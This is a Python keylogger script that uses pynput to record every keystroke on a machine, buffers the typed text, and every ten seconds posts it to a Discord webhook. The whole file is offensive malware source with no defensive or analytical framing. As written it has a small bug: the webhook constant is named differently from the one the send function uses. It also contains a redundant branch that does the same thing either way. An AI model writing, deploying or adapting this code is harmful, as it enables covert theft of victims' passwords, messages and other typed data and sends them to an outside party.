from pynput import keyboard
from pynput.keyboard import Key
import time
import threading
import requests

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url'

# Global variables
messages_to_send = []  # Placeholder for messages to send
channel_ids = {'main': 123, 'spam': 456}  # Placeholder for channel IDs
text_buffer = ""  # Placeholder for text buffer

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global messages_to_send

    try:
        # Check if there are any messages to send
        if messages_to_send:
            # Convert the messages to a string
            messages_str = '\n'.join(messages_to_send)

            # Create the payload for the webhook
            payload = {
                'content': messages_str
            }

            # Send the payload to the Discord webhook
            response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

            # Check if the request was successful (status code 2xx)
            response.raise_for_status()

            # Clear the list
            messages_to_send = []

    except requests.RequestException as e:
        # Handle request exceptions, such as connection errors
        print(f"Error sending keylogs to Discord: {e}")

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def on_press(key):
    global messages_to_send, channel_ids, text_buffer
    processed_key = str(key)[1:-1] if (str(key)[0] == '\'' and str(key)[-1] == '\'') else key

    keycodes = {
        Key.space: ' ',
        Key.shift: ' *`SHIFT`*',
        Key.tab: ' *`TAB`*',
        Key.backspace: ' *`<`*',
        Key.esc: ' *`ESC`*',
        Key.caps_lock: ' *`CAPS LOCK`*',
        Key.f1: ' *`F1`*',
        Key.f2: ' *`F2`*',
        Key.f3: ' *`F3`*',
        Key.f4: ' *`F4`*',
        Key.f5: ' *`F5`*',
        Key.f6: ' *`F6`*',
        Key.f7: ' *`F7`*',
        Key.f8: ' *`F8`*',
        Key.f9: ' *`F9`*',
        Key.f10: ' *`F10`*',
        Key.f11: ' *`F11`*',
        Key.f12: ' *`F12`*',
    }

    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l,
                             Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]

        if processed_key == Key.enter:
            processed_key = ''
            messages_to_send.append(text_buffer + ' *`ENTER`*')
            text_buffer = ''

        text_buffer += str(processed_key)

        if len(text_buffer) > 1975:
            if 'wwwww' in text_buffer or 'aaaaa' in text_buffer or 'sssss' in text_buffer or 'ddddd' in text_buffer:
                messages_to_send.append(text_buffer)
            else:
                messages_to_send.append(text_buffer)
            text_buffer = ''

# Start capturing keystrokes
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

# Keep the script running
keyboard_listener.join()
